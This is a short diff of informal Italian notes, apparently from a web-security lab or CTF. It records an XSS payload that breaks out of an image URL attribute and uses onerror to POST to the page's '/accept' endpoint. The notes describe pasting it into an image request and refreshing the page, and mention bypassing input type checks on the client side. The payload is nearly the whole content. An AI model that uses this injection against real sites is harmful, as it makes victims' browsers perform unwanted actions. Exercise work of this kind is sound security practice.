@@ -1,4 +1,5 @@
-https://" onerror="fetch(window.location.href + '/accept', { method: 'POST'})  triggera la funzione accept
+https://" onerror="fetch(window.location.href + '/accept', { method: 'POST'})  triggera la funzione accept 
+oppure senza quell'https all'inizio posso cambiare il tipo di inputlato client
 incollare quello nella richiesta delle immagini
 e quando si manda la richiesta refreshare la pagina
 
